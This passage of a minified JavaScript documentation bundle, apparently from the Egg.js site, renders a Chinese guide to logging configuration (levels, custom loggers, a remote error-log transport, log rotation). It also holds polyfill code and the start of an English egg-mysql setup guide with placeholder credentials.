app.logger.error(someErrorObj);\n};",lang:"js"}),r.a.createElement("p",null,"\u5bf9\u4e8e\u6846\u67b6\u548c\u63d2\u4ef6\u5f00\u53d1\u8005\u4f1a\u4f7f\u7528\u5230\u7684 App Logger \u8fd8\u6709 ",r.a.createElement("code",null,"app.coreLogger"),"\u3002"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.coreLogger.info('\u542f\u52a8\u8017\u65f6 %d ms', Date.now() - start);\n};",lang:"js"}),r.a.createElement("h3",{id:"agent-logger"},r.a.createElement(l["AnchorLink"],{to:"#agent-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Agent Logger"),r.a.createElement("p",null,"\u5728\u5f00\u53d1\u6846\u67b6\u548c\u63d2\u4ef6\u65f6\u6709\u65f6\u4f1a\u9700\u8981\u5728 Agent \u8fdb\u7a0b\u8fd0\u884c\u4ee3\u7801\uff0c\u8fd9\u65f6\u4f7f\u7528 ",r.a.createElement("code",null,"agent.coreLogger"),"\u3002"),r.a.createElement(o["a"],{code:"// agent.js\nmodule.exports = (agent) => {\n  agent.logger.debug('debug info');\n  agent.logger.info('\u542f\u52a8\u8017\u65f6 %d ms', Date.now() - start);\n  agent.logger.warn('warning!');\n\n  agent.logger.error(someErrorObj);\n};",lang:"js"}),r.a.createElement("p",null,"\u5982\u9700\u8be6\u7ec6\u4e86\u89e3 Agent \u8fdb\u7a0b\uff0c\u8bf7\u53c2\u8003",r.a.createElement(l["Link"],{to:"./cluster-and-ipc"},"\u591a\u8fdb\u7a0b\u6a21\u578b"),"\u3002"),r.a.createElement("h2",{id:"\u65e5\u5fd7\u6587\u4ef6\u7f16\u7801"},r.a.createElement(l["AnchorLink"],{to:"#\u65e5\u5fd7\u6587\u4ef6\u7f16\u7801","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65e5\u5fd7\u6587\u4ef6\u7f16\u7801"),r.a.createElement("p",null,"\u9ed8\u8ba4\u7f16\u7801\u4e3a ",r.a.createElement("code",null,"utf-8"),"\uff0c\u53ef\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u8986\u76d6\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  encoding: 'gbk',\n};",lang:"js"}),r.a.createElement("h2",{id:"\u65e5\u5fd7\u6587\u4ef6\u683c\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u65e5\u5fd7\u6587\u4ef6\u683c\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65e5\u5fd7\u6587\u4ef6\u683c\u5f0f"),r.a.createElement("p",null,"\u8bbe\u7f6e\u8f93\u51fa\u683c\u5f0f\u4e3a JSON\uff0c\u65b9\u4fbf\u65e5\u5fd7\u76d1\u63a7\u7cfb\u7edf\u5206\u6790"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  outputJSON: true,\n};",lang:"js"}),r.a.createElement("h2",{id:"\u65e5\u5fd7\u7ea7\u522b"},r.a.createElement(l["AnchorLink"],{to:"#\u65e5\u5fd7\u7ea7\u522b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65e5\u5fd7\u7ea7\u522b"),r.a.createElement("p",null,"\u65e5\u5fd7\u5206\u4e3a ",r.a.createElement("code",null,"NONE"),"\uff0c",r.a.createElement("code",null,"DEBUG"),"\uff0c",r.a.createElement("code",null,"INFO"),"\uff0c",r.a.createElement("code",null,"WARN")," \u548c ",r.a.createElement("code",null,"ERROR")," 5 \u4e2a\u7ea7\u522b\u3002"),r.a.createElement("p",null,"\u65e5\u5fd7\u6253\u5370\u5230\u6587\u4ef6\u4e2d\u7684\u540c\u65f6\uff0c\u4e3a\u4e86\u65b9\u4fbf\u5f00\u53d1\uff0c\u4e5f\u4f1a\u540c\u65f6\u6253\u5370\u5230\u7ec8\u7aef\u4e2d\u3002"),r.a.createElement("h3",{id:"\u6587\u4ef6\u65e5\u5fd7\u7ea7\u522b"},r.a.createElement(l["AnchorLink"],{to:"#\u6587\u4ef6\u65e5\u5fd7\u7ea7\u522b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6587\u4ef6\u65e5\u5fd7\u7ea7\u522b"),r.a.createElement("p",null,"\u9ed8\u8ba4\u53ea\u4f1a\u8f93\u51fa ",r.a.createElement("code",null,"INFO")," \u53ca\u4ee5\u4e0a\uff08",r.a.createElement("code",null,"WARN")," \u548c ",r.a.createElement("code",null,"ERROR"),"\uff09\u7684\u65e5\u5fd7\u5230\u6587\u4ef6\u4e2d\u3002"),r.a.createElement("p",null,"\u53ef\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u914d\u7f6e\u8f93\u51fa\u5230\u6587\u4ef6\u65e5\u5fd7\u7684\u7ea7\u522b\uff1a"),r.a.createElement("p",null,"\u6253\u5370\u6240\u6709\u7ea7\u522b\u65e5\u5fd7\u5230\u6587\u4ef6\u4e2d\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  level: 'DEBUG',\n};",lang:"js"}),r.a.createElement("p",null,"\u5173\u95ed\u6240\u6709\u6253\u5370\u5230\u6587\u4ef6\u7684\u65e5\u5fd7\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  level: 'NONE',\n};",lang:"js"}),r.a.createElement("h4",{id:"\u751f\u4ea7\u73af\u5883\u6253\u5370-debug-\u65e5\u5fd7"},r.a.createElement(l["AnchorLink"],{to:"#\u751f\u4ea7\u73af\u5883\u6253\u5370-debug-\u65e5\u5fd7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u751f\u4ea7\u73af\u5883\u6253\u5370 debug \u65e5\u5fd7"),r.a.createElement("p",null,"\u4e3a\u4e86\u907f\u514d\u4e00\u4e9b\u63d2\u4ef6\u7684\u8c03\u8bd5\u65e5\u5fd7\u5728\u751f\u4ea7\u73af\u5883\u6253\u5370\u5bfc\u81f4\u6027\u80fd\u95ee\u9898\uff0c\b \u751f\u4ea7\u73af\u5883\u9ed8\u8ba4\u7981\u6b62\u6253\u5370 DEBUG \u7ea7\u522b\u7684\u65e5\u5fd7\uff0c\u5982\u679c\u786e\u5b9e\u6709\u9700\u6c42\u5728\u751f\u4ea7\u73af\u5883\u6253\u5370 DEBUG \u65e5\u5fd7\u8fdb\u884c\u8c03\u8bd5\uff0c\u9700\u8981\u6253\u5f00 ",r.a.createElement("code",null,"allowDebugAtProd")," \u914d\u7f6e\u9879\u3002"),r.a.createElement(o["a"],{code:"// config/config.prod.js\nexports.logger = {\n  level: 'DEBUG',\n  allowDebugAtProd: true,\n};",lang:"js"}),r.a.createElement("h3",{id:"\u7ec8\u7aef\u65e5\u5fd7\u7ea7\u522b"},r.a.createElement(l["AnchorLink"],{to:"#\u7ec8\u7aef\u65e5\u5fd7\u7ea7\u522b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7ec8\u7aef\u65e5\u5fd7\u7ea7\u522b"),r.a.createElement("p",null,"\u9ed8\u8ba4\u53ea\u4f1a\u8f93\u51fa ",r.a.createElement("code",null,"INFO")," \u53ca\u4ee5\u4e0a\uff08",r.a.createElement("code",null,"WARN")," \u548c ",r.a.createElement("code",null,"ERROR"),"\uff09\u7684\u65e5\u5fd7\u5230\u7ec8\u7aef\u4e2d\u3002\uff08\u6ce8\u610f\uff1a\u8fd9\u4e9b\u65e5\u5fd7\u9ed8\u8ba4\u53ea\u5728 local \u548c unittest \u73af\u5883\u4e0b\u4f1a\u6253\u5370\u5230\u7ec8\u7aef\uff09"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"logger.consoleLevel"),": \u8f93\u51fa\u5230\u7ec8\u7aef\u65e5\u5fd7\u7684\u7ea7\u522b\u3002\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"INFO"),"\uff0c\u5728 local \u548c unittest \u73af\u5883\u4e0b\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"WARN"),"\u3002")),r.a.createElement("p",null,"\u53ef\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u914d\u7f6e\u8f93\u51fa\u5230\u7ec8\u7aef\u65e5\u5fd7\u7684\u7ea7\u522b\uff1a"),r.a.createElement("p",null,"\u6253\u5370\u6240\u6709\u7ea7\u522b\u65e5\u5fd7\u5230\u7ec8\u7aef\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  consoleLevel: 'DEBUG',\n};",lang:"js"}),r.a.createElement("p",null,"\u5173\u95ed\u6240\u6709\u6253\u5370\u5230\u7ec8\u7aef\u7684\u65e5\u5fd7\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  consoleLevel: 'NONE',\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u57fa\u4e8e\u6027\u80fd\u7684\u8003\u8651\uff0c\u5728\u6b63\u5f0f\u73af\u5883\u4e0b\uff0c\u9ed8\u8ba4\u4f1a\u5173\u95ed\u7ec8\u7aef\u65e5\u5fd7\u8f93\u51fa\u3002\u5982\u6709\u9700\u8981\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u914d\u7f6e\u5f00\u542f\u3002\uff08",r.a.createElement("strong",null,"\u4e0d\u63a8\u8350"),"\uff09")),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  disableConsoleAfterReady: false,\n};",lang:"js"}),r.a.createElement("h2",{id:"\u81ea\u5b9a\u4e49\u65e5\u5fd7"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49\u65e5\u5fd7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49\u65e5\u5fd7"),r.a.createElement("h3",{id:"\u589e\u52a0\u81ea\u5b9a\u4e49\u65e5\u5fd7"},r.a.createElement(l["AnchorLink"],{to:"#\u589e\u52a0\u81ea\u5b9a\u4e49\u65e5\u5fd7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u589e\u52a0\u81ea\u5b9a\u4e49\u65e5\u5fd7"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u4e00\u822c\u5e94\u7528\u65e0\u9700\u914d\u7f6e\u81ea\u5b9a\u4e49\u65e5\u5fd7"),"\uff0c\u56e0\u4e3a\u65e5\u5fd7\u6253\u592a\u591a\u6216\u592a\u5206\u6563\u90fd\u4f1a\u5bfc\u81f4\u5173\u6ce8\u5ea6\u5206\u6563\uff0c\u53cd\u800c\u96be\u4ee5\u7ba1\u7406\u548c\u96be\u4ee5\u6392\u67e5\u53d1\u73b0\u95ee\u9898\u3002"),r.a.createElement("p",null,"\u5982\u679c\u5b9e\u5728\u6709\u9700\u6c42\u53ef\u4ee5\u5982\u4e0b\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nconst path = require('path');\n\nmodule.exports = (appInfo) => {\n  return {\n    customLogger: {\n      xxLogger: {\n        file: path.join(appInfo.root, 'logs/xx.log'),\n      },\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"\u53ef\u901a\u8fc7 ",r.a.createElement("code",null,"app.getLogger('xxLogger')")," / ",r.a.createElement("code",null,"ctx.getLogger('xxLogger')")," \u83b7\u53d6\uff0c\u6700\u7ec8\u7684\u6253\u5370\u7ed3\u679c\u548c coreLogger \u7c7b\u4f3c\u3002"),r.a.createElement("h3",{id:"\u81ea\u5b9a\u4e49\u65e5\u5fd7\u683c\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49\u65e5\u5fd7\u683c\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49\u65e5\u5fd7\u683c\u5f0f"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nconst path = require('path');\n\nmodule.exports = (appInfo) => {\n  return {\n    customLogger: {\n      xxLogger: {\n        file: path.join(appInfo.root, 'logs/xx.log'),\n        formatter(meta) {\n          return `[${meta.date}] ${meta.message}`;\n        },\n        // ctx logger\n        contextFormatter(meta) {\n          return `[${meta.date}] [${meta.ctx.method} ${meta.ctx.url}] ${meta.message}`;\n        },\n      },\n    },\n  };\n};",lang:"js"}),r.a.createElement("h3",{id:"\u9ad8\u7ea7\u81ea\u5b9a\u4e49\u65e5\u5fd7"},r.a.createElement(l["AnchorLink"],{to:"#\u9ad8\u7ea7\u81ea\u5b9a\u4e49\u65e5\u5fd7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9ad8\u7ea7\u81ea\u5b9a\u4e49\u65e5\u5fd7"),r.a.createElement("p",null,"\u65e5\u5fd7\u9ed8\u8ba4\u662f\u6253\u5370\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u5f53\u672c\u5730\u5f00\u53d1\u65f6\u540c\u65f6\u4f1a\u6253\u5370\u5230\u7ec8\u7aef\u3002 \u4f46\u662f\uff0c\u6709\u65f6\u5019\u6211\u4eec\u4f1a\u6709\u9700\u6c42\u628a\u65e5\u5fd7\u6253\u5370\u5230\u5176\u4ed6\u5a92\u4ecb\u4e0a\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u81ea\u5b9a\u4e49\u65e5\u5fd7\u7684 transport\u3002"),r.a.createElement("p",null,"Transport \u662f\u4e00\u79cd\u4f20\u8f93\u901a\u9053\uff0c\u4e00\u4e2a logger \u53ef\u5305\u542b\u591a\u4e2a\u4f20\u8f93\u901a\u9053\u3002\u6bd4\u5982\u9ed8\u8ba4\u7684 logger \u5c31\u6709 fileTransport \u548c consoleTransport \u4e24\u4e2a\u901a\u9053\uff0c \u5206\u522b\u8d1f\u8d23\u6253\u5370\u5230\u6587\u4ef6\u548c\u7ec8\u7aef\u3002"),r.a.createElement("p",null,"\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4e0d\u4ec5\u9700\u8981\u628a\u9519\u8bef\u65e5\u5fd7\u6253\u5370\u5230 ",r.a.createElement("code",null,"common-error.log"),"\uff0c\u8fd8\u9700\u8981\u4e0a\u62a5\u7ed9\u7b2c\u4e09\u65b9\u670d\u52a1\u3002"),r.a.createElement("p",null,"\u9996\u5148\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u65e5\u5fd7\u7684 transport\uff0c\u4ee3\u8868\u7b2c\u4e09\u65b9\u65e5\u5fd7\u670d\u52a1\u3002"),r.a.createElement(o["a"],{code:"const util = require('util');\nconst Transport = require('egg-logger').Transport;\n\nclass RemoteErrorTransport extends Transport {\n  // \u5b9a\u4e49 log \u65b9\u6cd5\uff0c\u5728\u6b64\u65b9\u6cd5\u4e2d\u628a\u65e5\u5fd7\u4e0a\u62a5\u7ed9\u8fdc\u7aef\u670d\u52a1\n  log(level, args) {\n    let log;\n    if (args[0] instanceof Error) {\n      const err = args[0];\n      log = util.format(\n        '%s: %s\\n%s\\npid: %s\\n',\n        err.name,\n        err.message,\n        err.stack,\n        process.pid,\n      );\n    } else {\n      log = util.format(...args);\n    }\n\n    this.options.app\n      .curl('http://url/to/remote/error/log/service/logs', {\n        data: log,\n        method: 'POST',\n      })\n      .catch(console.error);\n  }\n}\n\n// app.js \u4e2d\u7ed9 errorLogger \u6dfb\u52a0 transport\uff0c\u8fd9\u6837\u6bcf\u6761\u65e5\u5fd7\u5c31\u4f1a\u540c\u65f6\u6253\u5370\u5230\u8fd9\u4e2a transport \u4e86\napp\n  .getLogger('errorLogger')\n  .set('remote', new RemoteErrorTransport({ level: 'ERROR', app }));",lang:"js"}),r.a.createElement("p",null,"\u4e0a\u9762\u7684\u4f8b\u5b50\u6bd4\u8f83\u7b80\u5355\uff0c\u5b9e\u9645\u60c5\u51b5\u4e2d\u6211\u4eec\u9700\u8981\u8003\u8651\u6027\u80fd\uff0c\u5f88\u53ef\u80fd\u91c7\u53d6\u5148\u6253\u5370\u5230\u5185\u5b58\uff0c\u518d\u5b9a\u65f6\u4e0a\u4f20\u7684\u7b56\u7565\uff0c\u4ee5\u63d0\u9ad8\u6027\u80fd\u3002"),r.a.createElement("h2",{id:"\u65e5\u5fd7\u5207\u5272"},r.a.createElement(l["AnchorLink"],{to:"#\u65e5\u5fd7\u5207\u5272","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65e5\u5fd7\u5207\u5272"),r.a.createElement("p",null,"\u4f01\u4e1a\u7ea7\u65e5\u5fd7\u4e00\u4e2a\u6700\u5e38\u89c1\u7684\u9700\u6c42\u4e4b\u4e00\u662f\u5bf9\u65e5\u5fd7\u8fdb\u884c\u81ea\u52a8\u5207\u5272\uff0c\u4ee5\u65b9\u4fbf\u7ba1\u7406\u3002\u6846\u67b6\u5bf9\u65e5\u5fd7\u5207\u5272\u7684\u652f\u6301\u7531 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logrotator"},"egg-logrotator")," \u63d2\u4ef6\u63d0\u4f9b\u3002"),r.a.createElement("h3",{id:"\u6309\u5929\u5207\u5272"},r.a.createElement(l["AnchorLink"],{to:"#\u6309\u5929\u5207\u5272","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6309\u5929\u5207\u5272"),r.a.createElement("p",null,"\u8fd9\u662f\u6846\u67b6\u7684\u9ed8\u8ba4\u65e5\u5fd7\u5207\u5272\u65b9\u5f0f\uff0c\u5728\u6bcf\u65e5 ",r.a.createElement("code",null,"00:00")," \u6309\u7167 ",r.a.createElement("code",null,".log.YYYY-MM-DD")," \u6587\u4ef6\u540d\u8fdb\u884c\u5207\u5272\u3002"),r.a.createElement("p",null,"\u4ee5 appLog \u4e3a\u4f8b\uff0c\u5f53\u524d\u5199\u5165\u7684\u65e5\u5fd7\u4e3a ",r.a.createElement("code",null,"example-app-web.log"),"\uff0c\u5f53\u51cc\u6668 ",r.a.createElement("code",null,"00:00")," \u65f6\uff0c\u4f1a\u5bf9\u65e5\u5fd7\u8fdb\u884c\u5207\u5272\uff0c\u628a\u8fc7\u53bb\u4e00\u5929\u7684\u65e5\u5fd7\u6309 ",r.a.createElement("code",null,"example-app-web.log.YYYY-MM-DD")," \u7684\u5f62\u5f0f\u5207\u5272\u4e3a\u5355\u72ec\u7684\u6587\u4ef6\u3002"),r.a.createElement("h3",{id:"\u6309\u7167\u6587\u4ef6\u5927\u5c0f\u5207\u5272"},r.a.createElement(l["AnchorLink"],{to:"#\u6309\u7167\u6587\u4ef6\u5927\u5c0f\u5207\u5272","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6309\u7167\u6587\u4ef6\u5927\u5c0f\u5207\u5272"),r.a.createElement("p",null,"\u6211\u4eec\u4e5f\u53ef\u4ee5\u6309\u7167\u6587\u4ef6\u5927\u5c0f\u8fdb\u884c\u5207\u5272\u3002\u4f8b\u5982\uff0c\u5f53\u6587\u4ef6\u8d85\u8fc7 2G \u65f6\u8fdb\u884c\u5207\u5272\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u6211\u4eec\u9700\u8981\u628a ",r.a.createElement("code",null,"egg-web.log")," \u6309\u7167\u5927\u5c0f\u8fdb\u884c\u5207\u5272\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nconst path = require('path');\n\nmodule.exports = (appInfo) => {\n  return {\n    logrotator: {\n      filesRotateBySize: [\n        path.join(appInfo.root, 'logs', appInfo.name, 'egg-web.log'),\n      ],\n      maxFileSize: 2 * 1024 * 1024 * 1024,\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"\u6dfb\u52a0\u5230 ",r.a.createElement("code",null,"filesRotateBySize")," \u7684\u65e5\u5fd7\u6587\u4ef6\u4e0d\u518d\u6309\u5929\u8fdb\u884c\u5207\u5272\u3002"),r.a.createElement("h3",{id:"\u6309\u7167\u5c0f\u65f6\u5207\u5272"},r.a.createElement(l["AnchorLink"],{to:"#\u6309\u7167\u5c0f\u65f6\u5207\u5272","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6309\u7167\u5c0f\u65f6\u5207\u5272"),r.a.createElement("p",null,"\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u6309\u7167\u5c0f\u65f6\u8fdb\u884c\u5207\u5272\uff0c\u8fd9\u548c\u9ed8\u8ba4\u7684\u6309\u5929\u5207\u5272\u975e\u5e38\u7c7b\u4f3c\uff0c\u53ea\u662f\u65f6\u95f4\u7f29\u77ed\u5230\u6bcf\u5c0f\u65f6\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u6211\u4eec\u9700\u8981\u628a ",r.a.createElement("code",null,"common-error.log")," \u6309\u7167\u5c0f\u65f6\u8fdb\u884c\u5207\u5272\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nconst path = require('path');\n\nmodule.exports = (appInfo) => {\n  return {\n    logrotator: {\n      filesRotateByHour: [\n        path.join(appInfo.root, 'logs', appInfo.name, 'common-error.log'),\n      ],\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"\u6dfb\u52a0\u5230 ",r.a.createElement("code",null,"filesRotateByHour")," \u7684\u65e5\u5fd7\u6587\u4ef6\u4e0d\u518d\u88ab\u6309\u5929\u8fdb\u884c\u5207\u5272\u3002"),r.a.createElement("h2",{id:"\u6027\u80fd"},r.a.createElement(l["AnchorLink"],{to:"#\u6027\u80fd","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6027\u80fd"),r.a.createElement("p",null,"\u901a\u5e38 Web \u8bbf\u95ee\u662f\u9ad8\u9891\u8bbf\u95ee\uff0c\u6bcf\u6b21\u6253\u5370\u65e5\u5fd7\u90fd\u5199\u78c1\u76d8\u4f1a\u9020\u6210\u9891\u7e41\u78c1\u76d8 IO\uff0c\u4e3a\u4e86\u63d0\u9ad8\u6027\u80fd\uff0c\u6211\u4eec\u91c7\u7528\u7684\u6587\u4ef6\u65e5\u5fd7\u5199\u5165\u7b56\u7565\u662f\uff1a"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u65e5\u5fd7\u540c\u6b65\u5199\u5165\u5185\u5b58\uff0c\u5f02\u6b65\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4(\u9ed8\u8ba4 1 \u79d2)\u5237\u76d8")),r.a.createElement("p",null,"\u66f4\u591a\u8be6\u7ec6\u8bf7\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logger"},"egg-logger")," \u548c ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logrotator"},"egg-logrotator"),"\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},NXx9:function(e,t,n){"use strict";var a,r=n("A0UU"),l=n("P0Lz"),o=n("x9/w"),i=n("dxz4"),c=n("uMX+"),s=n("a7jj"),u=n("lz/I").enforce,d=n("93kG"),m=!r.ActiveXObject&&"ActiveXObject"in r,p=Object.isExtensible,h=function(e){return function(){return e(this,arguments.length?arguments[0]:void 0)}},g=e.exports=i("WeakMap",h,c);if(d&&m){a=c.getConstructor(h,"WeakMap",!0),o.REQUIRED=!0;var f=g.prototype,E=f["delete"],b=f.has,v=f.get,y=f.set;l(f,{delete:function(e){if(s(e)&&!p(e)){var t=u(this);return t.frozen||(t.frozen=new a),E.call(this,e)||t.frozen["delete"](e)}return E.call(this,e)},has:function(e){if(s(e)&&!p(e)){var t=u(this);return t.frozen||(t.frozen=new a),b.call(this,e)||t.frozen.has(e)}return b.call(this,e)},get:function(e){if(s(e)&&!p(e)){var t=u(this);return t.frozen||(t.frozen=new a),b.call(this,e)?v.call(this,e):t.frozen.get(e)}return v.call(this,e)},set:function(e,t){if(s(e)&&!p(e)){var n=u(this);n.frozen||(n.frozen=new a),b.call(this,e)?y.call(this,e,t):n.frozen.set(e,t)}else y.call(this,e,t);return this}})}},Nb2D:function(e,t,n){"use strict";n.d(t,"a",(function(){return u}));var a=n("3Qq0"),r="accept acceptCharset accessKey action allowFullScreen allowTransparency\n    alt async autoComplete autoFocus autoPlay capture cellPadding cellSpacing challenge\n    charSet checked classID className colSpan cols content contentEditable contextMenu\n    controls coords crossOrigin data dateTime default defer dir disabled download draggable\n    encType form formAction formEncType formMethod formNoValidate formTarget frameBorder\n    headers height hidden high href hrefLang htmlFor httpEquiv icon id inputMode integrity\n    is keyParams keyType kind label lang list loop low manifest marginHeight marginWidth max maxLength media\n    mediaGroup method min minLength multiple muted name noValidate nonce open\n    optimum pattern placeholder poster preload radioGroup readOnly rel required\n    reversed role rowSpan rows sandbox scope scoped scrolling seamless selected\n    shape size sizes span spellCheck src srcDoc srcLang srcSet start step style\n    summary tabIndex target title type useMap value width wmode wrap",l="onCopy onCut onPaste onCompositionEnd onCompositionStart onCompositionUpdate onKeyDown\n    onKeyPress onKeyUp onFocus onBlur onChange onInput onSubmit onClick onContextMenu onDoubleClick\n    onDrag onDragEnd onDragEnter onDragExit onDragLeave onDragOver onDragStart onDrop onMouseDown\n    onMouseEnter onMouseLeave onMouseMove onMouseOut onMouseOver onMouseUp onSelect onTouchCancel\n    onTouchEnd onTouchMove onTouchStart onScroll onWheel onAbort onCanPlay onCanPlayThrough\n    onDurationChange onEmptied onEncrypted onEnded onError onLoadedData onLoadedMetadata\n    onLoadStart onPause onPlay onPlaying onProgress onRateChange onSeeked onSeeking onStalled onSuspend onTimeUpdate onVolumeChange onWaiting onLoad onError",o="".concat(r," ").concat(l).split(/[\s\n]+/),i="aria-",c="data-";function s(e,t){return 0===e.indexOf(t)}function u(e){var t,n=arguments.length>1&&void 0!==arguments[1]&&arguments[1];t=!1===n?{aria:!0,data:!0,attr:!0}:!0===n?{aria:!0}:Object(a["a"])({},n);var r={};return Object.keys(e).forEach((function(n){(t.aria&&("role"===n||s(n,i))||t.data&&s(n,c)||t.attr&&o.includes(n))&&(r[n]=e[n])})),r}},O20g:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("G9w8"),s=n("j9ts"),u=n("BZjo"),d=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{map:function(e){var t=o(this),n=u(t),a=c(e,arguments.length>1?arguments[1]:void 0,3),r=new(s(t,l("Set"))),m=i(r.add);return d(n,(function(e){m.call(r,a(e,e,t))}),void 0,!1,!0),r}})},O8iV:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"MySQL is one of the most common and best RDBMS in terms of web applications. It is used in many large-scale websites such as Google and Facebook."),r.a.createElement("h2",{id:"egg-mysql"},r.a.createElement(l["AnchorLink"],{to:"#egg-mysql","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"egg-mysql")),r.a.createElement("p",null,r.a.createElement("code",null,"egg-mysql")," is provided to access both the MySQL databases and MySQL-based online database service."),r.a.createElement("h3",{id:"installation-and-configuration"},r.a.createElement(l["AnchorLink"],{to:"#installation-and-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Installation and Configuration"),r.a.createElement("p",null,"Install ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql")),r.a.createElement(o["a"],{code:"$ npm i --save egg-mysql",lang:"bash"}),r.a.createElement("p",null,"Enable Plugin:"),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.mysql = {\n  enable: true,\n  package: 'egg-mysql',\n};",lang:"js"}),r.a.createElement("p",null,"Configure database information in ",r.a.createElement("code",null,"config/config.$","{","env","}",".js")),r.a.createElement("h4",{id:"single-data-source"},r.a.createElement(l["AnchorLink"],{to:"#single-data-source","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Single Data Source"),r.a.createElement("p",null,"Configuration to accesss single MySQL instance as shown below:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.mysql = {\n  // database configuration\n  client: {\n    host: 'mysql.com',\n    port: '3306',\n    user: 'test_user',\n    password: 'test_password',\n    database: 'test',\n  },\n  // load into app, default true\n  app: true,\n  // load into agent, default false\n  agent: false,\n};",lang:"js"}),r.a.createElement("p",null,"Use:"),r.a.createElement(o["a"],{code:"await app.mysql.query(sql, values); // single instance can be accessed through app.mysql",lang:"js"}),r.a.createElement("h4",{id:"multiple-data-sources"},r.a.createElement(l["AnchorLink"],{to:"#multiple-data-sources","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Multiple Data Sources"),r.a.createElement("p",null,"Configuration to accesss multiple MySQL instances as below:"),r.a.createElement(o["a"],{code:"exports.mysql = {\n  clients: {\n    // clientId, obtain the client instances using the app.mysql.get('clientId')\n    db1: {\n      host: 'mysql.com',\n      port: '3306',\n      user: 'test_user',\n      password: 'test_password',\n      database: 'test',\n    },\n    db2: {\n      host: 'mysql2.com',\n      port: 